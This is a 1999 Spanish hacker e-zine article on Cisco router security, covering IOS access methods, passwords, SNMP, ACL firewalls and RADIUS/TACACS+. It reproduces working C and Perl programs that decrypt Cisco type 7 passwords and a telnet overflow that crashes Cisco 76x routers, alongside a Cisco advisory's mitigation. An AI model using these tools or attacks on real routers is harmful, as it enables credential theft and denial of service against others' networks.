@@ -1,0 +1,757 @@
+-[ 0x11 ]--------------------------------------------------------------------
+-[ SEGURIDAD EN ROUTERS CISCO ]----------------------------------------------
+-[ by Hendrix ]-------------------------------------------------------SET-20-
+
+
+/////////////////////////////////////////////////////////////////////
+/////								/////
+/////	           SEGURIDAD EN ROUTERS CISCO v1.0              /////
+/////                                                           /////
+/////		     por Hendrix     Julio-1999                 /////
+/////								/////
+/////////////////////////////////////////////////////////////////////
+
+
+Disclamer:
+Toda la informacion que a aparece en este documento ha sido extraida de
+los manuales de Cisco que aparecen en su web asi que no me toqueis los
+huevos con resposabilidades legales.
+
+Introduccion:
+En SET#18 escribi un articulo explicando el funcionamiento de un router
+Cisco y de los comandos mas usuales del Cisco IOS (show, ping, etc..)
+Lo titule curso de routers cisco I, pues bien, supuestamente esta seria
+la leccion 2 pero no me gustaba el formato y he decidido cambiarlo. Que
+asi mola mas. En vez de ir haciendo partes ire ampliando las versiones
+de este documento, si tengo ganas, claro...
+
+0. Indice
+---------
+
+
+	1. Ficheros de Configuracion 
+	2. Como acceder al router
+	3. Acceso Consola
+	4. Acceso Telnet
+	5. Password modo enable
+	6. Acceso SNMP
+	7. Acceso TFTP
+	8. Firewall
+	9. Autenticacion local
+	10. Autenticacion Remota (RADIUS/TACACS+)
+	11. Control de acceso PAP/CHAP
+	12. Firewall PIX
+	13. Bugs DoS
+
+
+1. Ficheros de configuracion
+-----------------------------
+
+El Cisco IOS tiene solo dos ficheros, el "running-config" y el 
+"startup-config" que se pueden ver con el comando show en modo enable. 
+
+router# show running-config
+
+Estos archivos se pueden modificar desde la linea de comandos del router o
+cargando el fichero mediante una conexion TFTP. 
+
+El running-config es la configuracion que se esta utilizando es ese momento,
+el fichero se encuentra en la memoria volatil por lo que los cambios que se
+realicen no seran permanentes. Para hacer los cambios permanentes habra
+que utilizar la orden.
+
+router# copy running-config startup-config
+
+El startup-config se graba en la memoria no volatil (NVRAM) y sera el 
+fichero de configuracion utilizado al reiniciar el router.
+
+
+
+2. Como acceder al Router
+--------------------------
+
+Existen varias maneras de acceder al router:
+
+- Consola: acceso a traves del puerto serie
+- Telnet: tipico
+- SNMP
+- TFTP
+
+Como ya dije en el anterior articulo, al entrar al router por telnet o
+por consola nos aparece el siguiente mensaje:
+
+User Access Verificafion
+Password: *******
+router>
+
+y entramos al router en modo no-privilegiado lo que nos permite monitorizar
+el trafico pero sin poder modificar la configuracion. Para acceder al modo
+privilegiado:
+
+router> enable
+Password: *******
+router#
+
+Ya estamos en modo privilegiado, se diferencia por el promt #. IOS no utiliza
+logins normalmente, solo passwords.
+
+
+3. Acceso por Consola
+-----------------------
+
+En el fichero de configuracion nos encontramos con las siguientes lineas
+
+line console 0       /* line con 0, tambien vale */
+login                
+password hola
+exec-timeout 1 30
+
+Cada tipo de acceso tiene un numero de lineas asociadas, el acceso consola
+tiene solo una line, el 0. Login indica el tipo de autenticacion de usuario, 
+en este caso ninguno. Password indica la contrase~a en claro. Se puede
+encriptar de modo parecido a unix. El comando exec-timeout indica el tiempo 
+maximo que puede estar activa la conexion, en este caso 1 minuto 30 segundos.
+
+En el ejemplo del pasado articulo teniamos esto:
+!
+line con 0
+ exec-timeout 40 0
+
+No se declaraba ninguna contrase~a para acceder por consola y se establece
+un timeout de 40 minutos (por defecto el timeout es de 10 minutos)
+
+
+4. Acceso Telnet
+------------------
+
+Cada puerto telnet recibe el nombre de terminal virtual (VTY). 
+
+line vty 0 4
+login
+password prueba
+
+En este ejemplo se configuran 5 puertos virtuales del 0 al 4 y todos
+con la misma password "prueba".
+
+Se puede restringir el acceso por telnet definiendo una lista. La listas
+se definen con el siguente esquema:
+
+>>> access-list [numero] [permit/deny] IP mascara
+
+Ejemplo:
+
+access-list 12 permit 192.85.55.0 0.0.0.255
+line vty 0 4
+access-class 12 in
+
+En este caso se permite el acceso a los puertos vty solo desde las maquinas
+de la red 192.85.55.0, las listas se explicaran mas adelante cuando hablemos
+de firewalls. Se pueden definir listas del 0 al 99 y para activarlas se 
+utliza la orden: access-class [numero] in
+
+Se puede acceder via telnet a diferentes puertos TCP del router. En las
+versiones de IOS anteriores a 9.1(11.5), 9.21(3.2) y 10.0 (¿? cuantas
+versiones, menudo caos que llevan los de cisco!) los puertos son los
+siguientes:
+
+7:    Echo
+9:    Discard
+23:   Telnet
+79:   Finger
+1993: SNMP sobre TCP
+
+del 2001 al 2999: Telnet al puerto auxiliar (AUX), terminal (TTY) y terminal
+		  virtual (VTY)
+del 3001 al 3999: Telnet a los puertos rotary 
+del 4001 al 4999: Telnet modo stream, mirror del rango 2000
+del 5001 al 5999: Telnet modo stream, mirror del rango 3000
+del 6001 al 6999: Telnet modo binario, mirror del rango 2000
+del 7001 al 7999: Telnet modo binario, mirror del rango 3000
+del 8001 al 8999: Xremote (solo servidores de comunicacion)
+del 9001 al 9999: Reversal Xremote (solo servidores de comunicacion)
+del 10001 al 19999: Reverse Xremote rotary
+
+Los puertos rotary (3000, 5000, 7000 y 10000) deben ser configurados 
+explicitamente con el comando rotary. De lo contrario no funcionaran. Por
+cierto no me preguntes que significa lo de rotary ni lo de Xremote porque
+yo tampoco lo se ;)
+
+[Daemon: Xremote, que empieza por X y es distribuido?. X Windows!.
+Xremote es un protocolo para "mejorar" el rendimiento de XWindows
+sobre enlaces en serie.
+En cuanto a rotary pues primero lo traducimos a castellano y eso
+ayuda :-DD, aluego descubrimos que se trata de agrupar lineas en
+"rotary groups" y mas tarde descubrimos que el grupo rotary 1 esta
+en el puerto 3001, el rotary 2 en el 3002 y asi. Normalmente se hace para 
+distribuir lineas en DDR (Dial on Demand Routing), para "reservarse" lineas
+(netadmin rules!) o..moveos vosotros que seguro que aprendeis mas]
+
+En las versiones 9.1(11.5), 9.21(3.2), 10.0 y posteriores se arreglo el
+caos de puertos abiertos quedando definitivamente asi:
+
+7:    Echo
+9:    Discard
+23:   Telnet
+79:   Finger
+1993: SNMP sobre TCP
+2001: Puerto auxiliar (AUX)
+4001: Puerto auxiliar (AUX) modo stream
+6001: Puerto auxiliar (AUX) modo binario
+
+Se puede cerrar el puerto finger con el comando "no service finger", para
+cerrar los puertos 7 y 9 se puede utilizar el comando "no service
+tcp-small-servers" y, para los puertos telnet, aux y SNMP se pueden
+definir listas de acceso.
+
+
+5. Password modo enable
+-------------------------
+
+router# enable secret pepe
+
+Con este comando creamos una contrase~a para el modo enable, igual para
+cualquier tipo de acceso (consola, telnet, ...). Recordad que para que
+el cambio sea permanente es necesario copiarlo en el startup-config.
+
+Esta contrase~a se puede encriptar con el comando enable secret.
+
+router# configure terminal
+router(config)# enable secret pepe
+router(config)# exit
+router# show running-config
+Bulding configuration ...
+
+Current configuration:
+!
+version 11.1
+! bla, bla, bla ...
+enable secret 5 $1$h7dd$VTNs4.BAfQMUU0Lrvmw6570
+!
+! bla, bla, bla ...
+
+Entramos en modo configure y creamos la password enable, en este caso
+"pepe" con el comando enable secret. Salimos y abrimos el fichero de 
+configuracion donde podemos ver la password encriptada.
+
+En el manual se pide que se realicen posteriormente los pasos siguientes, 
+no se que sentido tienen pero lo pongo por si acaso:
+
+router# configure terminal
+router(config)# enable secret 5 $1$h7dd$VTNs4.BAfQMUU0Lrvmw6570
+router(config)# exit
+
+La clave se encripta con el algoritmo MD5, un algoritmo muy fuerte.
+Finalmente se copia al startup para que los cambios sean permanentes.
+
+router# copy running-config startup-config
+
+
+6. Acceso SNMP
+----------------
+
+El comando para configurar este acceso es el siguiene,
+snmp-server community <string> [RO|RW] [lista de acceso]
+
+por ejemplo, para permitir acceso SNMP no privilegiado
+
+snmp-server community public RO 1
+
+Si queremos dar acceso solo desde las maquinas 1.1.1.1 y 2.2.2.2;
+
+access-list 1 permit 1.1.1.1
+access-list 1 permit 2.2.2.2
+snmp-server community public RO 1
+
+Para dar acceso al modo privilegiado con el string private:
+
+snmp-server community private RW 1
+
+El acceso privilegiado permite modificar la configuracion, en cambio, el no 
+privilegiado solo permite monitorizar el trafico.
+
+
+7. Acceso TFTP
+----------------
+
+Se puede modificar el archivo de configuracion via TFTP, este metodo es
+mas comodo pero tambien tiene sus peligros ya que puede ser utilizado por 
+otras personas para acceder al router sin autorizacion (y no miro a nadie ;))
+enviando un fichero de configuracion modificado.
+Ademas del TFTP se pude utilizar el Maintenance Operations Protocol (MOP),
+LAT o X.25.
+
+
+8. FIREWALL
+-------------
+
+Un router Cisco pueden funcionar como un firewall a nivel de red permitiendo
+o denegando el acceso a IPs determinadas. Esto se consigue con las listas
+de acceso:
+
+access-list nn [permit/deny]  ip IP-in Mask-in IP-out Mask-out
+
+Para permitir el acceso a las maquinas 147.22.x.x
+
+acces-list 101 permit ip 147.22.0.0 0.0.255.255 0.0.0.0 255.255.255.255
+
+Se pueden filtrar por otros protocolos [tcp, udp y icmp] en lugar de por ip.
+Por ejemplo, para denegar el acceso a conexiones udp a las maquinas de la
+red 156.23.22.0
+
+access-list 101 deny udp 156.23.22.0 0.0.0.255 0.0.0.0 255.255.255.255
+
+Una opcion imprescindible en toda lista de acceso que se precie es impedir
+los ataques por spoofing, es muy sencillo solo tenemos que restringir los
+accesos con una ip interior que vienen del exterior, suponiendo que nuestra
+red es la 123.2.0.0 solo tenemos que hacer
+
+access-list 102 deny ip 123.2.0.0 0.0.255.255 0.0.0.0 255.255.255.255
+
+
+Tambien se puede filtrar por puertos, especificando un puerto concreto (eq x)
+o un rango (gt x, mas grande que x por ejemplo)
+
+Para permitir trafico Domain Name System (DNS) y Network Time Protocol (NTP)
+usamos esto:
+
+access-list 101 permit ip 0.0.0.0 255.255.255.255 0.0.0.0 255.255.255.255 eq 53
+access-list 101 permit ip 0.0.0.0 255.255.255.255 0.0.0.0 255.255.255.255 eq 123
+
+Este ejemplo deniega el acceso al Network File System (NFS) usando el puerto
+UDP,
+
+access-list 101 deny udp 0.0.0.0 255.255.255.255 0.0.0.0 255.255.255.255 eq 2049
+
+... 
+
+(y podria estar escribiendo ejemplos hasta cansarme, que es precisamente
+lo que acaba de pasarme ;)  ... )
+
+Despues de definir la lista de acceso es necesario guardala en la memoria no
+volatil (NVRAM) y aplicarla a un interface concreto, por ejemplo
+
+interface ethernet 0
+ip access-group 101 
+
+
+9. Autenticacion Local
+------------------------
+
+Se pueden declarar logins y password personalizados, el comando es el
+siguiente
+
+username juan password 7 hola123
+username pedro password 7 aaafr3
+
+Con la opcion 7 el password se guarda cifrado, con 0 el password se guardaria
+en claro. Al entrar al router tendriamos:
+
+User Access Verification
+Username: juan
+Password: hola123
+router>
+
+La encriptacion utilizada es muy pobre y puede romperse facilmente, el motivo
+es que en algunos casos, como en el protocolo CHAP, el propio router necesita
+la clave en claro. El objetivo de esta esta encriptacion es impedir que
+alguien obtenga la clave a simple vista. Se trata pues de una debilidad 
+asumida por la propia compa~ia. En el caso de la clave enable se utiliza el
+algoritmo "5" que que como ya dijimos es el MD5 y es indescifrable. A 
+continuacion muestro dos programas, uno en C y otro en Perl que descifran el
+algoritmo "7".  
+
+
+<++> set_020/cisco/ciscocrack.c
+/* This code is originally from a Bugtraq post by 
+   Jared Mauch <jared@puck.nether.net> . I patched it with an improved
+   translation table by Janos Zsako <zsako@BANKNET.NET>
+   -Fyodor (fyodor@dhp.com) */
+
+
+#include <stdio.h>
+#include <ctype.h>
+
+char xlat[] = {
+        0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f,
+        0x41, 0x2c, 0x2e, 0x69, 0x79, 0x65, 0x77, 0x72,
+        0x6b, 0x6c, 0x64, 0x4a, 0x4b, 0x44, 0x48, 0x53 , 0x55, 0x42
+};
+
+char pw_str1[] = " password 7 ";
+char pw_str2[] = "enable password 7 ";
+char pw_str3[] = "ip ftp password 7 ";
+char pw_str4[] = " ip ospf message-digest-key 1 md5 7 ";
+
+char *pname;
+
+cdecrypt(enc_pw, dec_pw)
+char *enc_pw;
+char *dec_pw;
+{
+        unsigned int seed, i, val = 0;
+
+        if(strlen(enc_pw) & 1)
+                return(-1);
+
+        seed = (enc_pw[0] - '0') * 10 + enc_pw[1] - '0';
+
+        if (seed > 15 || !isdigit(enc_pw[0]) || !isdigit(enc_pw[1]))
+                return(-1);
+
+        for (i = 2 ; i <= strlen(enc_pw); i++) {
+                if(i !=2 && !(i & 1)) {
+                        dec_pw[i / 2 - 2] = val ^ xlat[seed++];
+                        val = 0;
+                }
+
+                val *= 16;
+
+                if(isdigit(enc_pw[i] = toupper(enc_pw[i]))) {
+                        val += enc_pw[i] - '0';
+                        continue;
+                }
+
+                if(enc_pw[i] >= 'A' && enc_pw[i] <= 'F') {
+                        val += enc_pw[i] - 'A' + 10;
+                        continue;
+                }
+
+                if(strlen(enc_pw) != i)
+                        return(-1);
+        }
+
+        dec_pw[++i / 2] = 0;
+
+        return(0);
+}
+
+usage()
+{
+        fprintf(stdout, "Usage: %s -p <encrypted password>\n", pname);
+        fprintf(stdout, "       %s <router config file> <output file>\n", pname);
+
+        return(0);
+}
+
+main(argc,argv)
+int argc;
+char **argv;
+
+{
+        FILE *in = stdin, *out = stdout;
+        char line[257];
+        char passwd[65];
+        unsigned int i, pw_pos;
+
+        pname = argv[0];
+
+        if(argc > 1)
+        {
+                if(argc > 3) {
+                        usage();
+                        exit(1);
+                }
+
+                if(argv[1][0] == '-')
+                {
+                        switch(argv[1][1]) {
+                                case 'h':
+                                usage();
+                                break;
+
+                                case 'p':
+				bzero(passwd, sizeof(passwd));
+                                if(cdecrypt(argv[2], passwd)) {
+                                        fprintf(stderr, "Error.\n");
+                                        exit(1);
+                                }
+                                fprintf(stdout, "password: %s\n", passwd);
+                                break;
+
+                                default:
+                                fprintf(stderr, "%s: unknow option.", pname);
+                        }
+
+                        return(0);
+                }
+
+                if((in = fopen(argv[1], "rt")) == NULL)
+                        exit(1);
+                if(argc > 2)
+                        if((out = fopen(argv[2], "wt")) == NULL)
+                                exit(1);
+        }
+
+        while(1) {
+                for(i = 0; i < 256; i++) {
+                        if((line[i] = fgetc(in)) == EOF) {
+                                if(i)
+                                        break;
+
+                                fclose(in);
+                                fclose(out);
+                                return(0);
+                        }
+                        if(line[i] == '\r')
+                                i--;
+
+                        if(line[i] == '\n')
+                                break;
+                }
+                pw_pos = 0;
+                line[i] = 0;
+
+                if(!strncmp(line, pw_str1, strlen(pw_str1)))
+                        pw_pos = strlen(pw_str1);
+
+                if(!strncmp(line, pw_str2, strlen(pw_str2)))
+                        pw_pos = strlen(pw_str2);
+		if(!strncmp(line, pw_str3, strlen(pw_str3)))
+			pw_pos = strlen(pw_str3);
+		if(!strncmp(line, pw_str4, strlen(pw_str4)))
+			pw_pos = strlen(pw_str4);
+
+                if(!pw_pos) {
+                        fprintf(stdout, "%s\n", line);
+                        continue;
+                }
+
+		bzero(passwd, sizeof(passwd));
+                if(cdecrypt(&line[pw_pos], passwd)) {
+                        fprintf(stderr, "Error.\n");
+                        exit(1);
+                }
+                else {
+                        if(pw_pos == strlen(pw_str1))
+                                fprintf(out, "%s", pw_str1);
+                        else if (pw_pos == strlen(pw_str2))
+                                fprintf(out, "%s", pw_str2);
+			else if (pw_pos == strlen(pw_str3))
+				fprintf(out, "%s", pw_str3);
+			else if (pw_pos == strlen(pw_str4))
+				fprintf(out, "%s", pw_str4);
+
+
+                        fprintf(out, "%s\n", passwd);
+                }
+        }
+}
+<-->
+
+Date: Mon, 12 Jan 1998 00:36:09 +0200
+From: Riku Meskanen 
+To: BUGTRAQ@NETSPACE.ORG
+Subject: perl version of that tin opener (IOS decrypt.c)
+
+Howdy,
+
+Squeezed the decrypt.c[1] with perl a bit, just for seeing
+better how simple that IOS type 7 encryption really is.
+
+[1] http://www.rootshell.com/archive-Rbf4ahcmxzw5qn2S/199711/ciscocrack.c
+
+:-) riku
+
+
+<++> set_020/cisco/ciscocrack.pl
+#!/usr/bin/perl -w
+# $Id: ios7decrypt.pl,v 1.1 1998/01/11 21:31:12 mesrik Exp $
+#
+# Credits for orginal code and description hobbit@avian.org,
+# SPHiXe, .mudge et al. and for John Bashinski <jbash@CISCO.COM>
+# for Cisco IOS password encryption facts.
+#
+# Use for any malice or illegal purposes strictly prohibited!
+#
+
+@xlat = ( 0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41,
+          0x2c, 0x2e, 0x69, 0x79, 0x65, 0x77, 0x72, 0x6b, 0x6c,
+          0x64, 0x4a, 0x4b, 0x44, 0x48, 0x53 , 0x55, 0x42 );
+
+while (<>) {
+        if (/(password|md5)\s+7\s+([\da-f]+)/io) {
+            if (!(length($2) & 1)) {
+                $ep = $2; $dp = "";
+                ($s, $e) = ($2 =~ /^(..)(.+)/o);
+                for ($i = 0; $i < length($e); $i+=2) {
+                    $dp .= sprintf "%c",hex(substr($e,$i,2))^$xlat[$s++];
+                }
+                s/7\s+$ep/$dp/;
+            }
+        }
+        print;
+}
+# eof
+<-->
+
+
+10. Autenticacion Remota ( RADIUS / TACACS+ )
+----------------------------------------------
+
+Cuando se tiene un numero elevado de routers llevar un control de password
+local en cada un de ellos puede suponer un follon considerable. La opcion 
+utilizada en estos casos es instalar un servidor de autenticacion remota.
+Las posibles opciones son RADIUS (Remote Authentication Dial-In User
+Service) y TACACS+ (Terminal Access Controller Access Control System con
+mejoras propietarias de Cisco), estos sistemas se implementan generalmente
+en servidores Unix. Estos protocolos estan definidos en sus orrespondientes
+RFC.
+
+Primeramente hay que configurar en el router la maquina que hara de servidor
+de control de acceso. Por ejemplo,
+
+tacacs-server host 194.147.12.12
+tacacs-server key pepito
+
+En este ejemplo se define la IP del servidor TACACS+ y la clave de cifrado
+para las comunicaciones entre el router y el servidor "pepito". Igualmente
+para RADIUS tenemos,
+
+radius-server host alcatraz
+radius-server key pepito
+radius-server retransmit 4
+radius-server timeout 12
+
+Se puede indicar el nombre del servidor de control de acceso en lugar de su
+IP, ademas tambien es posible otras opciones como indicar el numero de 
+intentos maximos o el numero de segundos maximos permitido.
+
+El comando "tacacs-server last-resort [password|succeed] es interesante ya
+que indica la forma de autenticar en caso de que el servidor tacacs no
+funcione. La opcion password definiria un password y la opcion succeed 
+permitiria acceder sin password (una opcion muuuy peligrosa!!!!).
+
+Para que un usuario se autentifique en el servidor RADIUS utilizamos,
+
+line vty 0 4
+login radius
+
+o si usamos TACACS+,
+
+line vty 0 4
+login tacacs
+
+
+11. Control de acceso PAP/CHAP
+-------------------------------
+
+Si queremos cifrar las passwords sin utilizar claves nos encontramos con
+un dilema. Podemos enviar las claves en claro y mantener un directorio
+de claves cifradas en el servidor (ej, /etc/passwd) o por el contrario
+podemos enviar la clave cifrada guardar una copia en claro en el servidor.
+PAP es una implementacion de la primera opcion y CHAP es una implementacion
+de la segunda. PAP es susceptible a ataques de sniffers y CHAP lo es frente
+a intrusiones en el servidor. 
+
+En Infovia, el protocolo PPP utiliza PAP para enviar la contrase~a. Lo que
+permitiria capturarla si pinchasemos la linea telefonica del usuario.
+
+Si emplemos un control de acceso para una red de routers con un RADIUS o
+con TACACS+, se aconseja utilizar CHAP ya que el servidor se supone seguro.
+
+
+12. PIX Firewall
+-----------------
+
+El PIX Firewall es un aparato que realiza las funciones de firewall. Tiene
+la ventaja de que funciona con Cisco IOS y que es un aparato dedicado por lo
+que en principio deberia de tener pocos bugs en su S.O.
+Existen varios modelos en funcion del trafico que deben soportar. En 
+principio parece una buena opcion compacta de Firewall a todos los niveles.
+Se puede programar por telnet o por web y permite las mismas prestaciones de
+filtrar y crer logs que otros softwares como el famoso Firewall-1.
+
+
+13. Bugs DoS
+-------------
+
+El Cisco IOS es un S.O. dedicado por lo que es muy dificil encontrar bugs
+que permitan un acceso en modo privilegiado, lo que si existen son varios
+bugs que provocan un bloqueo de la maquina o la obligan a reiniciar. Por
+supuesto Cisco pone a disposicion toda una serie de parches y nuevas versiones
+del IOS que corrigen estos errores. Si quieres mas informacion sobre estos
+bugs puedes recurrir a los sitios de siempre: Bugtraq, CERT o la propia 
+Cisco...
+
+Como ejemplo pondre un par de ataques DoS que he encontrado por ahi:
+
+a)---------------------------------------------------
+
+Date: Thu, 11 Dec 1997 01:11:13 -0500
+From: Laslo Orto <Laslo@CPOL.COM>
+To: BUGTRAQ@NETSPACE.ORG
+Subject: cisco 76x buffer overflow
+
+El exploit es muy simple y cuelga los modelos mas sencillos de cisco, los 
+76x con la version del IOS restringida a 4 usuarios, ejemplo:
+
+telnet cisco762.domain.com
+Trying 1.2.3.4...
+Connected to 1.2.3.4.
+Escape character is '^]'.
+Enter Password:Poner_una_contrase~a_muyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
+yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
+yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
+yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
+yyyyyyyyyyyyyyyyyyyyyyyyyyyy_larga
+
+y podreis disfrutar un maravilloso espectaculo de luces que significa que el
+router esta reiniciando.
+
+
+b)----------------------------------------------------
+
+
+Date: Tue, 22 Dec 1998 13:39:30 -0800
+From: John Bashinski <jbash@CISCO.COM>
+Reply-To: Bugtraq List <BUGTRAQ@netspace.org>
+To: BUGTRAQ@netspace.org
+Subject: Cisco IOS 12.0 security bug
+
+Se nos ha reportado que un escaneo UDP con la herramienta NMAP provoca
+un crash en la version Cisco IOS 12.0 y hemos confirmado que el problema
+existe y que afecta a todas las variantes de la version 12.0 asi como
+a varias variantes de la version 11.3.
+
+El problema parece causado por el envio de paquetes al puerto syslog del
+router (puerto UDP 514). Se puede solucionar a~adiendo una lista de acceso
+que restrinja ese puerto, algo parecido a esto:    
+
+    ! Deny all multicasts to port 514
+    access-list 101 deny udp any 224.0.0.0 31.255.255.255 eq 514
+    ! Deny old-style broadcasts
+    access-list 101 deny udp any host 0.0.0.0 eq 514
+    ! Deny network-specific broadcasts (*example*; depends on local netmasks)
+    access-list 101 deny udp any 192.31.7.255 eq 514
+    ! Deny router's own addresses
+    access-list 101 deny udp any host <router-addr-1> eq 514
+    access-list 101 deny udp any host <router-addr-2> eq 514
+    access-list 101 deny udp any host <router-addr-3> eq 514
+    ... etc ...
+    access-list 101 permit ip any any
+
+    interface <interface-1>
+    ip access-group 101 in
+
+    interface <interface-2>
+    ip access-group 101 in
+
+    ... etc ...
+
+Si encuentras algun ataque como este, por favor reportalo a Cisco a la
+direccion "security-alert@cisco.com".
+
+Para mas informacion sobre procedimiento de seguridad de Cisco ver, 
+
+   http://www.cisco.com/warp/customer/791/sec_incident_response.shtml
+
+                                        -- J. Bashinski
+                                           Cisco Systems
+
+
+Esto es todo por hoy
+Hendrix 
+hendrix66@iname.com
+
+
+
